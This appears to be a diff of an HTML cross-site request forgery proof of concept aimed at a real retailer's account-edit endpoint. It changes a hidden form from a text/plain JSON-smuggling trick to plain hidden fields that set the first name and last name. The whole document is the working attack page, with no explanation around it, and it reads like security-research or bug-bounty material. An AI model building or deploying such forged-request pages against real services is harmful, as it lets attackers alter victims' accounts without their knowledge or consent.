@@ -1,14 +1,11 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>CSRF PoC - Change Wayfair Personal Info</h3>
-
     <form action="https://www.wayfair.com/v/account/personal_info/edit?_format=json"
-          method="POST"
-          enctype="text/plain">
-      <input type="hidden"
-             name='{"first_name":"CSRF","last_name":"PoC","submit":true}'
-             value="">
+          method="POST">
+      <input type="hidden" name="first_name" value="CSRF">
+      <input type="hidden" name="last_name" value="PoC">
+      <input type="hidden" name="submit" value="true">
       <input type="submit" value="Submit CSRF">
     </form>
   </body>
